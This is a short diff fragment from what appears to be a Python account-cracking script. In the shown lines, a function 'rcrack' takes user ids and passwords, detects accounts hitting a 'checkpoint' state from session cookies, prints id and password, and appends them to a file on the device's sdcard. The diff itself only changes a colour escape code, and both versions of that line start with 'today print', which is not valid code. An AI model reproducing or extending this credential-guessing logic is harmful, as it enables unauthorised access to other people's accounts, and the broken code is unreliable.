@@ -346,7 +346,7 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-           today print('    \033[1;30m(BHT-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+           today print('    \033[1;30m(BHT-CP)  ' +cid+ ' | ' +ps+           '  \033[0;97m')
                 open('/sdcard/BHT-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
